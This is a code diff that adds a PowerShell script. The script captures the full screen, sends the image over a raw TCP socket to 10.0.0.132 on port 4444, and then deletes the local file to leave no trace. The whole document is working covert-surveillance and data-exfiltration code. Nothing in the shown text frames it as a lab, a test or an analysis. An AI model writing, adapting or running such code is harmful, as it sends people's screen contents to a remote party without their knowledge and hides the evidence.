@@ -1,0 +1,27 @@
+try {
+	Add-Type -AssemblyName System.Windows.Forms
+	Add-Type -AssemblyName System.Drawing
+	$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+	$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+	$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+	$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+	$outputPath = "$env:TEMP\screenshot.png"
+	$bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
+
+	if (-not (Test-Path $outputPath)) { throw "File not found" }
+
+	$client = New-Object System.Net.Sockets.TCPClient("10.0.0.132", 4444)
+	$stream = $client.GetStream()
+	$file = [System.IO.File]::ReadAllBytes($outputPath)
+	$stream.Write($file, 0, $file.Length)
+	$stream.Flush()
+	
+	Start-Sleep -Seconds 3
+	
+	Remove-Item -Path "$env:TEMP\screenshot.png" -Force
+	
+	$stream.Close()
+	$client.Close()
+} catch {
+    Write-Host "Error: $_"
+}
